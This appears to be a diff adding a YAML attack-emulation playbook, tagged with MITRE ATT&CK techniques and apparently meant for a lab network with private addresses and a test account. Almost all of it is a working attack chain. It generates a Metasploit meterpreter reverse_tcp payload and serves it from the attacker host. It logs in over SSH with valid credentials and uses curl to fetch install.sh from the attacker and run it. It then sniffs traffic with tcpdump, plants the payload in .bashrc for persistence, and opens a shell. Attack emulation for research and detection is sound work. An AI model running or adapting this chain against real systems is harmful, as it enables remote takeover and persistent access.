@@ -1,0 +1,141 @@
+####################
+#
+# Caldera
+#
+####################
+vars:
+  $TARGET_ADDRESS: 192.42.1.175
+  $ATTACKER_ADDRESS: 192.42.1.174 
+  $LINUX_USER: aecid
+  $LINUX_USER_PASSWORD: aecid
+
+commands:
+#prepare the meterpreter payload/session
+  - type: mktemp
+    cmd: file
+    variable: RSHELL 
+
+  - type: msf-payload
+    cmd: cmd/unix/python/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    local_path: $RSHELL
+
+  - type: msf-module
+    creates_session: meterpreter
+    cmd: exploit/multi/handler
+    payload: "cmd/unix/python/meterpreter/reverse_tcp"
+    payload_options:
+      LHOST: $ATTACKER_ADDRESS
+      LPORT: "4444"
+    background: true
+    kill_on_exit: true
+
+  - type: webserv
+    local_path: $RSHELL
+    port: 8888
+    background: True
+    kill_on_exit: true
+
+
+#login with a valid account 
+  - type: ssh
+    creates_session: foothold
+    username: $LINUX_USER
+    key_filename: "/home/aecid/.ssh/key"
+    hostname: $TARGET_ADDRESS
+    cmd: id
+    metadata:
+      techniques: "T1078.002"
+      tactics: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts"
+
+#download the meterpreter payload and execute it
+  - type: ssh
+    session: foothold
+    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh -o /home/$LINUX_USER/install.sh\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "chmod +x /home/$LINUX_USER/install.sh\n"
+    interactive: True
+   
+  - type: ssh
+    session: foothold
+    cmd: "./install.sh\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 5
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo tcpdump host 192.42.1.174 and port 8888 -A\n"
+    interactive: True
+    metadata:
+      techniques: "T1040"
+      tactics: "Credential Access"
+      technique_name: "Network Sniffing"
+
+  - type: sleep
+    seconds: 10
+
+#stop process by sending ctrl-c
+  - type: ssh
+    session: foothold
+    cmd: "03"
+    interactive: True
+    bin: True  
+
+# Persistence
+  - type: ssh
+    cmd: "vim /home/$LINUX_USER/.bashrc\n"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: ":inoremap jj <ESC>\n"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: "/# for examples\n"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: "o"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: "./install.sh &"
+    session: foothold
+    interactive: True
+    metadata:
+      techniques: "T1547"
+      tactics: "Persistence, Privilege Escalation"
+      technique_name: "Boot or Logon Autostart Execution"
+
+  - type: ssh
+    cmd: "jj"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: ":wq!\n"
+    session: foothold
+    interactive: True
+
+  - type: msf-session
+    session: meterpreter
+    cmd: sysinfo
+
+# upgrade the session 
+  - type: msf-session
+    cmd: shell
+    session: foothold
+    
+
